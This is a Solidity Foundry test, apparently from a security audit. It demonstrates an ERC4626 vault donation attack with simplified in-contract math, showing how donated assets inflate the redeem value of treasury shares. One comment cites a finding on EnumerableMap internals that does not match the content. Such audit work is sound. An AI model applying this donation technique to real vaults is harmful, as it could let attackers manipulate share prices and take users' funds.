// SPDX-License-Identifier: Unlicense
pragma solidity >=0.8.0;

import {Test} from "forge-std/Test.sol";
import {console2} from "forge-std/console2.sol";

/// @notice Demonstrates ERC4626 donation attack on fullCapacity
/// @dev Corresponds to Finding 004 (OZ EnumerableMap internals)
/// @dev The vault donation attack is described in RBS findings 007+
contract PoC_004_VaultDonation is Test {

    // Simplified vault math
    uint256 vaultAssets = 100_000_000e18;
    uint256 vaultShares = 100_000_000e18;

    function previewRedeem(uint256 shares) public view returns (uint256) {
        return shares * vaultAssets / vaultShares;
    }

    function donate(uint256 amount) public {
        vaultAssets += amount;
    }

    function test_donationInflatesCapacity() public {
        uint256 treasuryShares = 50_000_000e18;

        uint256 valueBefore = previewRedeem(treasuryShares);
        console2.log("Value before donation:", valueBefore);

        donate(5_000_000e18);

        uint256 valueAfter = previewRedeem(treasuryShares);
        console2.log("Value after donation:", valueAfter);
        console2.log("Inflation:", valueAfter - valueBefore);

        assertGt(valueAfter, valueBefore);
    }
}
